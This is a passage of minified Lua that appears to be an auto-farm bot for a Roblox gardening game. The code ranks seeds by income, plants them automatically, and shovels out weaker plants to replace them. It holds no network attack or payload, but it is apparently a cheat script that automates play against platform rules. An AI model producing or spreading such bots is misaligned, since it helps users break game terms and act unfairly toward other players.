		local y = tonumber(V:GetAttribute("Age") or V:GetAttribute("CurrentAge")) or 0
		local j = tonumber(V:GetAttribute("MaxAge")) or 0
		return j > 0 and y >= j
	end,
	GetPlantFruitSlotsAdvancedIncomeFarm = function(G, V)
		if type(V) == "table" and V.single == true then
			return 1, true
		end
		local y = nil
		if type(G) == "table" then
			y = G.data
		end
		if type(y) == "table" and y.MaxFruitSpawnLocations ~= nil then
			local G = math.floor(tonumber(y.MaxFruitSpawnLocations) or 0)
			return math.max(G, 1), true
		end
		local Z = nil
		if type(G) == "table" then
			Z = G.physical
		end
		if typeof(Z) == "Instance" and Z.Parent then
			local G = Z:FindFirstChild("FruitSpawnLocations")
			if G then
				local V = # G:GetChildren()
				if V > 0 then
					return V, true
				end
			end
		end
		return 1, false
	end;
	GetExpectedFruitSlotsAdvancedIncomeFarm = function(G, V)
		if type(G) ~= "table" then
			return 1, false
		end
		if G.single == true then
			return 1, true
		end
		local y = nil
		if type(V) == "table" then
			y = V.fruitSlotStatsByName
		end
		local Z = nil
		if type(y) == "table" then
			Z = y[G.name]
		end
		if type(Z) == "table" and ((tonumber(Z.samples) or 0)) > 0 then
			return math.max(tonumber(Z.average) or 1, 1), true
		end
		return 1, false
	end;
	IsLowOutputPlantAdvancedIncomeFarm = function(G, V, y)
		if type(G) ~= "table" or G.single == true or G.mutationSeed == true then
			return false
		end
		if y ~= true then
			return false
		end
		local j = tonumber(g.RarityRank.Epic) or 4
		local i = tonumber(G.rarityRank) or 0
		if i <= 0 or i > j then
			return false
		end
		return ((tonumber(V) or 1)) <= Z.AdvancedIncomeFarm.LowFruitSlotThresholdAdvancedIncomeFarm
	end;
	GetBaseEconomicScoreAdvancedIncomeFarm = function(G, V, y, j, i)
		if type(G) ~= "table" or G.valid ~= true then
			return 0, 0, 0
		end
		if G.mutationSeed then
			return 1000000000000 + (((tonumber(G.rarityRank) or 0)) * 1000000), 0, 0
		end
		y = math.max(tonumber(y) or 1, 1)
		i = math.max(tonumber(i) or 1, 1)
		if G.single then
			i = 1
		end
		local c = Z.AdvancedIncomeFarm.GetStageSettingsAdvancedIncomeFarm(V)
		local J = G.plantTime / y
		local T = G.fruitCycleTime / y
		local d = J
		if not G.single then
			d = J + T
		end
		local u = math.max(tonumber(c.EvaluationWindow) or 300, 1)
		local q = 0
		local g = 0
		local E = 0
		local a = 0
		local H = 0
		if not G.single then
			a = ((i * 60)) / math.max(T, .001)
			H = a * G.cleanValue
			q = ((G.cleanValue * i)) / math.max(d, .001)
			g = H / 60
			E = a / 60
		else
			local V = math.max(d, u)
			a = 60 / V
			H = G.cleanValue * a
			q = H / 60
			g = q
			E = ((a / 60)) * .15
		end
		if j then
			E *= 3
		end
		local r = math.log(1 + math.max(q, 0))
		local Y = math.log(1 + math.max(g, 0))
		local e = math.log(1 + math.max(E, 0))
		local s = ((((r * c.ShortWeight) + (Y * c.LongWeight)) + (e * c.MutationWeight))) * 1000
		if G.slow then
			s *= c.SlowFactor
		end
		return s + (((tonumber(G.rarityRank) or 0)) * 2), a, H
	end;
	GetStageAdvancedIncomeFarm = function(G, V, y)
		V = math.max(math.floor(tonumber(V) or 0), 1)
		G = math.max(math.floor(tonumber(G) or 0), 0)
		y = math.max(math.floor(tonumber(y) or 0), 0)
		local Z = G / V
		local j = y / V
		if Z < .35 or j < .15 then
			return "Recovery"
		end
		if Z < .8 or j < .4 then
			return "Building"
		end
		if j < .6 then
			return "Compounding"
		end
		return "Rich"
	end,
	BuildSnapshotAdvancedIncomeFarm = function()
		if not Z.AdvancedIncomeFarm.EnsureCatalogAdvancedIncomeFarm() then
			return nil
		end
		local G = Z.FruitFiltersDataSync.GetPlantEntriesFruitFiltersDataSync()
		local V = math.max(Z.GardenSeedLimit.GetCurrentLimitGardenSeedLimit(), 1)
		local y = {}
		local j = {}
		local i = 0
		local c = 0
		local J = 0
		local T = 0
		local d = 0
		local u = 0
		local q = 0
		for G, V in ipairs(G) do
			local E = tostring(V.name or "")
			local a = Z.AdvancedIncomeFarm.CatalogAdvancedIncomeFarm[E]
			V.rarity = tostring(g.SeedRarity[E] or "Unknown")
			local H = Z.AdvancedIncomeFarm.IsPlantMatureAdvancedIncomeFarm(V)
			local r, Y = Z.AdvancedIncomeFarm.GetPlantFruitSlotsAdvancedIncomeFarm(V, a)
			V.matureAdvancedIncomeFarm = H
			V.fruitSlotsAdvancedIncomeFarm = r
			V.fruitSlotsKnownAdvancedIncomeFarm = Y
			y[E] = ((y[E] or 0)) + 1
			if V.rarity == "Common" then
				u += 1
			elseif V.rarity == "Uncommon" then
				q += 1
			end
			if type(a) == "table" then
				if not a.single then
					i += 1
					if H then
						c += 1
					end
					if Y then
						local G = j[E]
						if not G then
							G = {
								total = 0,
								samples = 0,
								minimum = r,
								maximum = r
							}
							j[E] = G
						end
						G.total += r
						G.samples += 1
						G.minimum = math.min(G.minimum, r)
						G.maximum = math.max(G.maximum, r)
					end
				end
				if a.slow and not H then
					J += 1
				end
				if a.goodSingle then
					T += 1
				end
				if a.starterSingle then
					d += 1
				end
			end
		end
		for G, V in pairs(j) do
			V.average = V.total / math.max(V.samples, 1)
		end
		local E = # G
		local a = Z.AdvancedIncomeFarm.GetStageAdvancedIncomeFarm(E, V, c)
		local H = Z.AdvancedIncomeFarm.IsGrowthWeatherActiveAdvancedIncomeFarm() and 2 or 1
		local r = Z.AdvancedIncomeFarm.IsMutationWeatherActiveAdvancedIncomeFarm()
		local Y = {}
		for G, V in ipairs(G) do
			local y = Z.AdvancedIncomeFarm.CatalogAdvancedIncomeFarm[tostring(V.name or "")]
			local j, i, c = Z.AdvancedIncomeFarm.GetBaseEconomicScoreAdvancedIncomeFarm(y, a, H, r, V.fruitSlotsAdvancedIncomeFarm)
			local J = Z.AdvancedIncomeFarm.IsLowOutputPlantAdvancedIncomeFarm(y, V.fruitSlotsAdvancedIncomeFarm, V.fruitSlotsKnownAdvancedIncomeFarm)
			if J then
				j *= .35
			end
			V.advancedScore = j
			V.fruitOutputPerMinuteAdvancedIncomeFarm = i
			V.incomePerMinuteAdvancedIncomeFarm = c
			V.lowOutputAdvancedIncomeFarm = J
			if j > 0 then
				table.insert(Y, j)
			end
		end
		local e = {
			plants = G;
			capacity = V,
			totalCount = E,
			countsByName = y,
			fruitSlotStatsByName = j,
			multiCount = i;
			matureMultiCount = c;
			unfinishedSlowCount = J,
			goodSingleCount = T,
			starterSingleCount = d,
			commonCount = u,
			uncommonCount = q,
			stageName = a;
			stageSettings = Z.AdvancedIncomeFarm.GetStageSettingsAdvancedIncomeFarm(a),
			growthMultiplier = H,
			mutationWeatherActive = r,
			medianPlantScore = Z.AdvancedIncomeFarm.GetMedianAdvancedIncomeFarm(Y)
		}
		Z.AdvancedIncomeFarm.LastSnapshotAdvancedIncomeFarm = e
		Z.AdvancedIncomeFarm.LastSnapshotAtAdvancedIncomeFarm = os.clock()
		return e
	end;
	GetUsableSprinklersAdvancedIncomeFarm = function(G, V, y)
		local j = {}
		if type(G) ~= "table" then
			return j
		end
		if not Z.AdvancedIncomeFarm.RequiresSprinklerAdvancedIncomeFarm(G) then
			return j
		end
		y = math.max(tonumber(y) or 1, 1)
		for V, Z in ipairs(V or {}) do
			local i = y * math.max(tonumber(Z.growSpeed) or 1, 1)
			local c = math.max(((tonumber(G.plantTime) or math.huge)) / i + 2, 5)
			if Z.remaining >= c and (Z.radius > 0 and typeof(Z.position) == "Vector3") then
				table.insert(j, Z)
			end
		end
		return j
	end,
	GetOwnedSeedsAdvancedIncomeFarm = function()
		local G = {}
		local V = {}
		local y = Z.AdvancedIncomeFarm.IsMutationSeedAllowedAdvancedIncomeFarm()
		for j, i in ipairs(Z.Backpack.GetBackpackAllItems()) do
			local c = Z.SmartSeedProgression.GetSeedNameFromToolSmartSeedProgression(i)
			if c == "" or Z.SmartSeedProgression.IsPreventedPlacementSeedSmartSeedProgression(c) then
				continue
			end
			local J = Z.AdvancedIncomeFarm.GetCatalogInfoAdvancedIncomeFarm(c)
			local T = Z.SmartSeedProgression.GetToolCountSmartSeedProgression(i)
			if type(J) ~= "table" or J.valid ~= true or T <= 0 then
				continue
			end
			if J.mutationSeed and not y then
				continue
			end
			if Z.StackKeepOverrides.ShouldSkipItemStackKeepOverrides("Seed", c, T) then
				continue
			end
			local d = G[c]
			if not d then
				d = {
					name = c;
					count = 0,
					tool = i,
					info = J
				}
				G[c] = d
				table.insert(V, d)
			end
			d.count += T
			if not d.tool or not d.tool.Parent or T > Z.SmartSeedProgression.GetToolCountSmartSeedProgression(d.tool) then
				d.tool = i
			end
		end
		return V
	end;
	IsCandidateEligibleAdvancedIncomeFarm = function(G, V, y, j)
		if type(G) ~= "table" or type(V) ~= "table" then
			return false, nil
		end
		local i = G.info
		if type(i) ~= "table" or i.valid ~= true then
			return false, nil
		end
		if i.mutationSeed then
			return Z.AdvancedIncomeFarm.IsMutationSeedAllowedAdvancedIncomeFarm(), nil
		end
		local c = Z.AdvancedIncomeFarm.GetSeedRuleAdvancedIncomeFarm(i.name)
		local J = tonumber(V.countsByName[i.name]) or 0
		local T = Z.AdvancedIncomeFarm.GetPlantLimitAdvancedIncomeFarm(i)
		if J >= T then
			return false, nil
		end
		if type(c) == "table" and (c.FillOnly == true and V.totalCount >= V.capacity) then
			return false, nil
		end
		if i.starterSingle and not ((type(c) == "table" and c.FillOnly == true)) then
			local G = Z.AdvancedIncomeFarm.StarterSingleHarvestLimitAdvancedIncomeFarm
			if V.multiCount >= G or V.starterSingleCount >= G then
				return false, nil
			end
			return true, nil
		end
		local d = type(c) == "table" and c.BypassGoodSingleLimit == true
		if i.goodSingle and not d then
			local G = math.min(Z.AdvancedIncomeFarm.GoodSingleHarvestLimitAdvancedIncomeFarm, math.max(math.floor(tonumber(V.stageSettings.GoodSingleLimit) or 0), 0))
			if V.goodSingleCount >= G then
				return false, nil
			end
		end
		if Z.AdvancedIncomeFarm.RequiresSprinklerAdvancedIncomeFarm(i) then
			local G = Z.AdvancedIncomeFarm.GetUsableSprinklersAdvancedIncomeFarm(i, y, V.growthMultiplier)
			if # G == 0 then
				return false, nil
			end
			return true, G
		end
		if i.starterSingle then
			return true, nil
		end
		if i.slow and j ~= true then
			local G = math.floor(V.capacity * V.stageSettings.InvestmentRatio)
			if V.unfinishedSlowCount >= G then
				return false, nil
			end
		end
		return true, nil
	end,
	GetCandidatesAdvancedIncomeFarm = function(G, V)
		local y = {}
		local j = {}
		local i = {}
		local c = Z.AdvancedIncomeFarm.GetActiveSprinklersAdvancedIncomeFarm()
		local J = Z.AdvancedIncomeFarm.GetOwnedSeedsAdvancedIncomeFarm()
		for J, T in ipairs(J) do
			local d, u = Z.AdvancedIncomeFarm.IsCandidateEligibleAdvancedIncomeFarm(T, G, c, V)
			if not d then
				continue
			end
			local q = T.info
			local g = G.growthMultiplier
			if type(u) == "table" and type(u[1]) == "table" then
				g *= math.max(tonumber(u[1].growSpeed) or 1, 1)
			end
			local E, a = Z.AdvancedIncomeFarm.GetExpectedFruitSlotsAdvancedIncomeFarm(q, G)
			local H, r, Y = Z.AdvancedIncomeFarm.GetBaseEconomicScoreAdvancedIncomeFarm(q, G.stageName, g, G.mutationWeatherActive, E)
			local e = Z.AdvancedIncomeFarm.IsLowOutputPlantAdvancedIncomeFarm(q, E, a)
			local s = 1
			if q.single then
				s = 0
			elseif a then
				if E >= 6 then
					s = 3
				elseif E >= 4 then
					s = 2
				else
					s = 0
				end
			end
			if e then
				H *= .35
			end
			if not q.mutationSeed then
				local V = math.floor(G.capacity * math.max(tonumber(G.stageSettings.FoundationMultiRatio) or 0, 0))
				if G.multiCount < V then
					if q.single then
						H *= .25
					else
						H *= 3
					end
				end
				local y = tonumber(G.countsByName[q.name]) or 0
				local Z = y / math.max(G.capacity, 1)
				H /= 1 + (Z * 2)
			end
			local N = Z.AdvancedIncomeFarm.GetSeedRuleAdvancedIncomeFarm(q.name)
			local W = y
			if type(N) == "table" and N.FallbackOnly == true then
				W = i
			elseif q.starterSingle then
				W = j
			end
			local X = Z.AdvancedIncomeFarm.RequiresSprinklerAdvancedIncomeFarm(q)
			table.insert(W, {
				name = q.name,
				count = T.count;
				info = q,
				score = H;
				sprinklers = u;
				requiresSprinkler = X,
				expectedFruitSlots = E;
				fruitSlotsKnown = a;
				fruitOutputPerMinute = r,
				incomePerMinute = Y,
				lowOutput = e,
				fruitPriority = s
			})
		end
		if # y == 0 then
			y = j
		end
		if # y == 0 and V == true then
			y = i
		end
		table.sort(y, function(G, V)
			if G.info.mutationSeed ~= V.info.mutationSeed then
				return G.info.mutationSeed == true
			end
			if G.info.single ~= V.info.single then
				return G.info.single ~= true
			end
			if G.fruitPriority ~= V.fruitPriority then
				return G.fruitPriority > V.fruitPriority
			end
			if G.lowOutput ~= V.lowOutput then
				return G.lowOutput ~= true
			end
			if G.score ~= V.score then
				return G.score > V.score
			end
			if G.fruitOutputPerMinute ~= V.fruitOutputPerMinute then
				return G.fruitOutputPerMinute > V.fruitOutputPerMinute
			end
			if G.expectedFruitSlots ~= V.expectedFruitSlots then
				return G.expectedFruitSlots > V.expectedFruitSlots
			end
			if G.incomePerMinute ~= V.incomePerMinute then
				return G.incomePerMinute > V.incomePerMinute
			end
			local y = tonumber(G.info.rarityRank) or 0
			local Z = tonumber(V.info.rarityRank) or 0
			if y ~= Z then
				return y > Z
			end
			if G.count ~= V.count then
				return G.count > V.count
			end
			return G.name < V.name
		end)
		return y, J
	end;
	GetGoodSinglePositionAdvancedIncomeFarm = function(G, V)
		local y = nil
		if type(G) == "table" then
			y = G.sprinklers
		end
		for G, y in ipairs(y or {}) do
			if type(y) ~= "table" or typeof(y.position) ~= "Vector3" then
				continue
			end
			for G, j in ipairs(Z.FarmGrid.GetSortedSpotsFarmGrid(y.position, Z.ControlMode.RightCol)) do
				local i = j.position
				if typeof(i) ~= "Vector3" or not Z.Seeder.IsPositionOpen(i, V) then
					continue
				end
				local c = i - y.position
				local J = (Vector2.new(c.X, c.Z)).Magnitude
				if J <= y.radius then
					return i
				end
			end
		end
		return nil
	end,
	GetCandidatePositionAdvancedIncomeFarm = function(G, V)
		if type(G) ~= "table" or type(G.info) ~= "table" then
			return nil, "Invalid seed candidate"
		end
		if G.requiresSprinkler == true then
			local y = Z.AdvancedIncomeFarm.GetGoodSinglePositionAdvancedIncomeFarm(G, V)
			if typeof(y) ~= "Vector3" then
				return nil, "No open sprinkler-covered position"
			end
			return y
		end
		return Z.SmartSeedProgression.GetGridPositionSmartSeedProgression(V)
	end,
	PlantCandidatesAdvancedIncomeFarm = function(G, V)
		if type(G) ~= "table" or # G == 0 then
			return false
		end
		local y = Z.Seeder.GetOccupiedPositions()
		local j = math.max(math.floor(tonumber(Z.SmartSeedProgression.MaxSpotAttemptsSmartSeedProgression) or 10), 1)
		local i = "Placement failed"
		for G, c in ipairs(G) do
			for G = 1, j, 1 do
				local j, J = Z.AdvancedIncomeFarm.GetCandidatePositionAdvancedIncomeFarm(c, y)
				if not j then
					i = tostring(J or "Planting position unavailable")
					break
				end
				Z.SmartSeedProgression.SetStatusSmartSeedProgression(string.format("%s | Planting %s", V.stageName, c.name), "#66CCFF", string.format("advanced=true | score=%.2f | garden=%d/%d", c.score, V.totalCount, V.capacity))
				local T, d = Z.SmartSeedProgression.PlaceSeedAtPositionSmartSeedProgression(c.name, j)
				if T then
					q.PositionGrid.Add(y, j)
					Z.SmartSeedProgression.SetStatusSmartSeedProgression(string.format("%s | Planted %s", V.stageName, c.name), "#7CFC00", string.format("advanced=true | attempts=%d", G))
					task.wait(Z.Seeder.GetDelay())
					return true
				end
				i = tostring(d or "Placement failed")
				q.PositionGrid.Add(y, j)
				task.wait(.05)
			end
		end
		Z.SmartSeedProgression.SetStatusSmartSeedProgression(i, "#FF6666")
		return false
	end;
	GetReplacementTargetBlockReasonAdvancedIncomeFarm = function(G)
		if type(G) ~= "table" then
			return "invalid", nil, 0
		end
		if Z.SmartSeedProgression.GetShovelPlantIdSmartSeedProgression(G) == "" then
			return "missing id", nil, 0
		end
		if Z.SmartSeedProgression.HasPlantMutationOrVariantSmartSeedProgression(G) then
			return "mutation/variant", nil, 0
		end
		if Z.SmartSeedProgression.IsProtectedPlantSmartSeedProgression(G.name) then
			return "protected plant", nil, 0
		end
		if Z.SmartSeedProgression.IsProtectedRaritySmartSeedProgression(G.rarity) then
			return "protected rarity", nil, 0
		end
		local V = Z.AdvancedIncomeFarm.GetCatalogInfoAdvancedIncomeFarm(G.name)
		if type(V) ~= "table" then
			return "unknown plant", nil, 0
		end
		local y = tonumber(V.rarityRank) or 0
		local j = tonumber(g.RarityRank.Legendary) or 5
		if y <= 0 then
			return "unknown rarity", V, y
		end
		if y > j then
			return "high tier protected", V, y
		end
		return nil, V, y
	end,
	GetReplacementTargetPriorityAdvancedIncomeFarm = function(G, V)
		local y = Z.AdvancedIncomeFarm.GetCatalogInfoAdvancedIncomeFarm(G.name)
		local j = type(y) == "table" and ((tonumber(y.rarityRank) or 0)) or 0
		local i = 1
		if type(y) == "table" and type(V) == "table" then
			local G = tonumber(V.countsByName[y.name]) or 0
			local j = Z.AdvancedIncomeFarm.GetPlantLimitAdvancedIncomeFarm(y)
			if G > j then
				i = 0
			end
		end
		return (j * 2) + i
	end;
	IsBetterReplacementCandidateAdvancedIncomeFarm = function(G, V)
		if type(G) ~= "table" or type(G.info) ~= "table" then
			return false
		end
		if type(V) ~= "table" or type(V.info) ~= "table" then
			return true
		end
		if G.info.mutationSeed ~= V.info.mutationSeed then
			return G.info.mutationSeed == true
		end
		local y = tonumber(G.info.rarityRank) or 0
		local j = tonumber(V.info.rarityRank) or 0
		if y ~= j then
			return y > j
		end
		local i = Z.AdvancedIncomeFarm.GetUpgradeRankAdvancedIncomeFarm(G.name)
		local c = Z.AdvancedIncomeFarm.GetUpgradeRankAdvancedIncomeFarm(V.name)
		if i ~= c then
			return i > c
		end
		return false
	end,
	CanReplacePlantAdvancedIncomeFarm = function(G, V, y)
		if type(G) ~= "table" or type(V) ~= "table" or type(y) ~= "table" then
			return false, "invalid"
		end
		if tostring(G.name or "") == tostring(V.name or "") then
			return false, "same plant"
		end
		if type(V.info) ~= "table" then
			return false, "unknown seed"
		end
		local j = Z.AdvancedIncomeFarm.GetSeedRuleAdvancedIncomeFarm(V.name)
		if V.info.starterSingle or (type(j) == "table" and j.FillOnly == true) then
			return false, "fill only seed"
		end
		local i = G.replacementInfoAdvancedIncomeFarm
		local c = tonumber(G.replacementRarityRankAdvancedIncomeFarm) or 0
		local J = nil
		if type(i) ~= "table" or c <= 0 then
			J, i, c = Z.AdvancedIncomeFarm.GetReplacementTargetBlockReasonAdvancedIncomeFarm(G)
		end
		if J then
			return false, J
		end
		local T = tonumber(V.info.rarityRank) or 0
		if T <= 0 then
			return false, "unknown rarity"
		end
		if T < c then
			return false, "lower tier seed"
		end
		local d = tonumber(G.advancedScore) or 0
		local u = tonumber(G.fruitOutputPerMinuteAdvancedIncomeFarm) or 0
		local q = tonumber(G.incomePerMinuteAdvancedIncomeFarm) or 0
		local E = tonumber(V.score) or 0
		local a = tonumber(V.fruitOutputPerMinute) or 0
		local H = tonumber(V.incomePerMinute) or 0
		local r = tostring(y.stageName or "Recovery")
		local Y = tonumber(g.RarityRank.Uncommon) or 2
		local e = tonumber(g.RarityRank.Epic) or 4
		local s = r == "Compounding" or r == "Rich"
		local N = Z.AdvancedIncomeFarm.GetUpgradeRankAdvancedIncomeFarm(G.name)
		local W = Z.AdvancedIncomeFarm.GetUpgradeRankAdvancedIncomeFarm(V.name)
		local X = W > 0 and W > N
		if V.info.mutationSeed then
			local V = tonumber(y.medianPlantScore) or 0
			local Z = s and c <= Y
			if not Z and (G.lowOutputAdvancedIncomeFarm ~= true and (V > 0 and d > V * 1.05)) then
				return false, "valuable plant"
			end
		elseif X then
		elseif s and c <= Y then
			if T <= c then
				return false, "low tier cleanup"
			end
			local G = E > d * 1.001
			local V = a > u * 1.001
			local y = H > q * 1.001
			if not G or (not V and not y) then
				return false, "not enough upgrade"
			end
		elseif G.lowOutputAdvancedIncomeFarm == true and c <= e then
			if a <= u * 1.001 then
				return false, "not more fruit"
			end
			if H < q * .999 then
				return false, "lower income"
			end
		elseif E < d * Z.AdvancedIncomeFarm.MinimumUpgradeMultiplierAdvancedIncomeFarm then
			return false, "not enough upgrade"
		end
		if not i.single and (G.matureAdvancedIncomeFarm and V.info.single == true) then
			local G = math.floor(y.capacity * y.stageSettings.MatureMultiFloorRatio)
			if y.matureMultiCount - 1 < G then
				return false, "income floor"
			end
		end
		return true, "ok"
	end;
	GetBestReplacementPairAdvancedIncomeFarm = function(G, V)
		local y = {}
		local j = {}
		for G, V in ipairs(V.plants or {}) do
			local i, c, J = Z.AdvancedIncomeFarm.GetReplacementTargetBlockReasonAdvancedIncomeFarm(V)
			if i then
				j[i] = ((j[i] or 0)) + 1
			else
				V.replacementInfoAdvancedIncomeFarm = c
				V.replacementRarityRankAdvancedIncomeFarm = J
				table.insert(y, V)
			end
		end
		table.sort(y, function(G, y)
			local j = Z.AdvancedIncomeFarm.GetReplacementTargetPriorityAdvancedIncomeFarm(G, V)
			local i = Z.AdvancedIncomeFarm.GetReplacementTargetPriorityAdvancedIncomeFarm(y, V)
			if j ~= i then
				return j < i
			end
			local c = Z.AdvancedIncomeFarm.GetUpgradeRankAdvancedIncomeFarm(G.name)
			local J = Z.AdvancedIncomeFarm.GetUpgradeRankAdvancedIncomeFarm(y.name)
			if c ~= J then
				return c < J
			end
			if ((tonumber(G.fruitSlotsAdvancedIncomeFarm) or 1)) ~= ((tonumber(y.fruitSlotsAdvancedIncomeFarm) or 1)) then
				return ((tonumber(G.fruitSlotsAdvancedIncomeFarm) or 1)) < ((tonumber(y.fruitSlotsAdvancedIncomeFarm) or 1))
			end
			if ((tonumber(G.advancedScore) or 0)) ~= ((tonumber(y.advancedScore) or 0)) then
				return ((tonumber(G.advancedScore) or 0)) < ((tonumber(y.advancedScore) or 0))
			end
			return tostring(G.name or "") < tostring(y.name or "")
		end)
		for i, c in ipairs(y) do
			local J = nil
			for G, y in ipairs(G or {}) do
				local i, T = Z.AdvancedIncomeFarm.CanReplacePlantAdvancedIncomeFarm(c, y, V)
				if i then
					if Z.AdvancedIncomeFarm.IsBetterReplacementCandidateAdvancedIncomeFarm(y, J) then
						J = y
					end
				else
					j[T] = ((j[T] or 0)) + 1
				end
			end
			if J then
				return J, c, j, y
			end
		end
		return nil, nil, j, y
	end;
	ReplaceWorstPlantAdvancedIncomeFarm = function(G, V)
		local y, j, i = Z.GardenSeedLimit.GetOverLimitStateGardenSeedLimit()
		if j < i then
			Z.SmartSeedProgression.SetStatusSmartSeedProgression(string.format("%s | Filling open garden space", tostring(V.stageName or "Advanced")), "#FFCC66", "advanced=true | replacement cancelled because garden is not full")
			return false
		end
		if y then
			local G = "Advanced"
			if type(V) == "table" and V.stageName ~= nil then
				G = tostring(V.stageName)
			end
			Z.SmartSeedProgression.SetStatusSmartSeedProgression(string.format("%s | Garden over limit %d/%d", G, j, i), "#FFCC66", "advanced=true | pick up placed pots before replacing plants")
			return false
		end
		local c, J, T, d = Z.AdvancedIncomeFarm.GetBestReplacementPairAdvancedIncomeFarm(G, V)
		if not J or not c then
			local G = string.format("advanced=true | targets=%d | common=%d | uncommon=%d | downgrade=%d | weak=%d", # ((d or {})), tonumber(V.commonCount) or 0, tonumber(V.uncommonCount) or 0, tonumber(T and T["lower tier seed"] or 0), tonumber(T and T["not enough upgrade"] or 0))
			Z.SmartSeedProgression.SetStatusSmartSeedProgression(string.format("%s | No owned upgrade", V.stageName), "#FFCC66", G)
			return false
		end
		local u = false
		for G, V in ipairs(Z.AdvancedIncomeFarm.GetOwnedSeedsAdvancedIncomeFarm()) do
			if tostring(V.name or "") == tostring(c.name or "") and ((tonumber(V.count) or 0)) > 0 then
				u = true
				break
			end
		end
		if not u then
			Z.SmartSeedProgression.SetStatusSmartSeedProgression(string.format("%s | Selected seed unavailable", V.stageName), "#FFCC66", "advanced=true | replacement cancelled before shovelling")
			return false
		end
		local q = Z.AdvancedIncomeFarm.GetCatalogInfoAdvancedIncomeFarm(J.name)
		local g = 0
		if type(q) == "table" then
			g = tonumber(q.rarityRank) or 0
		end
		local E = Z.SmartSeedProgression.GetShovelPlantIdSmartSeedProgression(J)
		local a, H = Z.ShovelTool.Equip()
		if not a then
			Z.SmartSeedProgression.SetStatusSmartSeedProgression("Shovel tool not found", "#FF6666")
			return false
		end
		local r = tonumber(J.incomePerMinuteAdvancedIncomeFarm) or 0
		local Y = tonumber(c.incomePerMinute) or 0
		local e = 0
		if r > 0 then
			e = ((((Y - r)) / r)) * 100
		end
		Z.SmartSeedProgression.SetStatusSmartSeedProgression(string.format("%s | Replacing %s \226\134\146 %s", V.stageName, J.name, c.name), "#FFCC66", string.format("advanced=true | slots=%.1f\226\134\146%.1f | income=%+.1f%%", tonumber(J.fruitSlotsAdvancedIncomeFarm) or 1, tonumber(c.expectedFruitSlots) or 1, e))
		y, j, i = Z.GardenSeedLimit.GetOverLimitStateGardenSeedLimit()
		if j < i then
			Z.ShovelTool.Cleanup(H)
			Z.SmartSeedProgression.SetStatusSmartSeedProgression(string.format("%s | Filling open garden space", V.stageName), "#FFCC66", "advanced=true | replacement cancelled before shovelling")
			return false
		end
		if y then
			Z.ShovelTool.Cleanup(H)
			Z.SmartSeedProgression.SetStatusSmartSeedProgression(string.format("%s | Garden over limit %d/%d", V.stageName, j, i), "#FFCC66", "advanced=true | replacement cancelled before shovelling")
			return false
		end
		local s = Z.ShovelTool.Use(E, "", a)
		Z.ShovelTool.Cleanup(H)
		if not s then
			Z.SmartSeedProgression.SetStatusSmartSeedProgression("Shovel request failed", "#FF6666")
			return false
		end
		Z.SmartSeedProgression.WaitForPlantRemovalSmartSeedProgression(J, V.totalCount, 3)
		local N = Z.AdvancedIncomeFarm.BuildSnapshotAdvancedIncomeFarm()
		if type(N) ~= "table" then
			Z.SmartSeedProgression.SetStatusSmartSeedProgression("Plant removed, garden data unavailable", "#FFCC66")
			return true
		end
		local W = Z.AdvancedIncomeFarm.GetCandidatesAdvancedIncomeFarm(N, false)
		local X = nil
		for G, V in ipairs(W) do
			if tostring(V.name or "") == tostring(c.name or "") then
				X = V
				break
			end
		end
		if not X and N.totalCount < N.capacity then
			W = Z.AdvancedIncomeFarm.GetCandidatesAdvancedIncomeFarm(N, true)
			for G, V in ipairs(W) do
				if tostring(V.name or "") == tostring(c.name or "") then
					X = V
					break
				end
			end
		end
		local h = nil
		if type(X) == "table" then
			h = X.info
		end
		local l = 0
		if type(h) == "table" then
			l = tonumber(h.rarityRank) or 0
		end
		if type(h) ~= "table" or h.starterSingle == true or l < g then
			Z.SmartSeedProgression.SetStatusSmartSeedProgression("Plant removed, selected seed unavailable", "#FFCC66")
			return true
		end
		return Z.AdvancedIncomeFarm.PlantCandidatesAdvancedIncomeFarm({
			X
		}, N)
	end;
	GetLiveSnapshotAdvancedIncomeFarm = function()
		if type(Z.AdvancedIncomeFarm.LastSnapshotAdvancedIncomeFarm) == "table" and os.clock() - Z.AdvancedIncomeFarm.LastSnapshotAtAdvancedIncomeFarm <= 1.5 then
			return Z.AdvancedIncomeFarm.LastSnapshotAdvancedIncomeFarm
		end
		return Z.AdvancedIncomeFarm.BuildSnapshotAdvancedIncomeFarm()
	end,
	BuildFruitReserveLookupAdvancedIncomeFarm = function(G)
		local V = {}
		local y = type(G) == "table" and tostring(G.stageName or "Recovery") or "Recovery"
		local j = Z.AdvancedIncomeFarm.GetStageSettingsAdvancedIncomeFarm(y)
		local i = math.max(tonumber(j.FruitReserveRatio) or 0, 0)
		if i <= 0 then
			return V
		end
		local c = {}
		for G, V in ipairs(Z.FruitFilters.GetAllFruits()) do
			local y = tostring(V.name or V.n or "")
			local j = Z.AdvancedIncomeFarm.GetCatalogInfoAdvancedIncomeFarm(y)
			local i, J, T = Z.FruitFilters.GetMutationLookup(V)
			local d = Z.FruitFilters.GetFruitVariant(V, J)
			if type(j) ~= "table" or j.single or tostring(T or "") ~= "" or d ~= "Normal" then
				continue
			end
			local u = 0
			if Z.BuySelectFruit and type(Z.BuySelectFruit.GetEstimatedPriceBuySelectFruit) == "function" then
				u = Z.BuySelectFruit.GetEstimatedPriceBuySelectFruit(y, V.sourceData, T)
			end
			if ((tonumber(u) or 0)) <= 0 then
				continue
			end
			table.insert(c, {
				key = Z.TotalControl.GetFruitWaitKeyTotalControl(V),
				price = tonumber(u) or 0
			})
		end
		table.sort(c, function(G, V)
			if G.price ~= V.price then
				return G.price > V.price
			end
			return G.key < V.key
		end)
		local J = math.floor(# c * i)
		if # c > 0 and i > 0 then
			J = math.max(J, 1)
		end
		for G = 1, math.min(J, # c), 1 do
			if c[G].key ~= "" then
				V[c[G].key] = true
			end
		end
		return V
	end,
	GetFruitReserveLookupAdvancedIncomeFarm = function(G)
		local V = type(G) == "table" and tostring(G.stageName or "Recovery") or "Recovery"
		local y = type(G) == "table" and G.mutationWeatherActive == true
		local j = os.clock() - Z.AdvancedIncomeFarm.LastFruitReserveBuildAdvancedIncomeFarm < 1.5 and (Z.AdvancedIncomeFarm.LastFruitReserveStageAdvancedIncomeFarm == V and Z.AdvancedIncomeFarm.LastFruitReserveWeatherAdvancedIncomeFarm == y)
		if j then
			return Z.AdvancedIncomeFarm.FruitReserveLookupAdvancedIncomeFarm
		end
		local i = {}
		if y then
			i = Z.AdvancedIncomeFarm.BuildFruitReserveLookupAdvancedIncomeFarm(G)
		end
		Z.AdvancedIncomeFarm.FruitReserveLookupAdvancedIncomeFarm = i
		Z.AdvancedIncomeFarm.LastFruitReserveBuildAdvancedIncomeFarm = os.clock()
